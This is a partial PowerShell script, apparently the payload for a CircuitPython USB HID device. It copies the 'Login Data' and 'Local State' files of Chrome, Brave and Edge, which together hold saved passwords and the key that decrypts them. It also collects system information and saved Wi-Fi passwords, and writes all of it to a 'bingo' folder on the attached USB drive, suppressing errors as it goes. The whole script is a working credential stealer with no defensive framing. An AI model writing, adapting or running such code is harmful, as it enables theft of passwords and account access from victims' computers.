...
# Path to the HID volume (CIRCUITPY) - Update to correct drive letter
$hidVolumePath = "D:\"  # Update the drive letter if necessary

# Check if the HID volume exists
if (-Not (Test-Path $hidVolumePath)) {
    Write-Host "CIRCUITPY volume not found."
    return
}

# Create the 'bingo' folder on the CIRCUITPY volume
$bingoDir = Join-Path -Path $hidVolumePath -ChildPath "bingo"
if (-Not (Test-Path $bingoDir)) {
    New-Item -ItemType Directory -Path $bingoDir
}
...
function CopyBrowserFiles {
    ...
    $browserDestDir = Join-Path -Path $bingoDir -ChildPath $browserName
    if (-Not (Test-Path $browserDestDir)) {
        New-Item -ItemType Directory -Path $browserDestDir
    }
...
# Save browser data and system information to the 'bingo' folder

# Chrome Data
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeFilesToCopy = @("Login Data")
CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination (Join-Path -Path $bingoDir -ChildPath "Chrome") -ErrorAction SilentlyContinue

# Brave Data
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
$braveFilesToCopy = @("Login Data")
CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" -Destination (Join-Path -Path $bingoDir -ChildPath "Brave") -ErrorAction SilentlyContinue
...
$edgeFilesToCopy = @("Login Data")
CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $bingoDir -ChildPath "Edge") -ErrorAction SilentlyContinue

# Gather system info and save to the 'bingo' folder
function GatherSystemInfo {
    $sysInfoDir = Join-Path -Path $bingoDir -ChildPath "SystemInfo"
    if (-Not (Test-Path $sysInfoDir)) {
        New-Item -ItemType Directory -Path $sysInfoDir
    }
...
# Retrieve and save Wi-Fi passwords to the 'bingo' folder
function GetWifiPasswords {
    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
    ...
    # Save results to the 'bingo' folder
    $results | Out-File -FilePath "$bingoDir\WiFi_Details.txt"
}
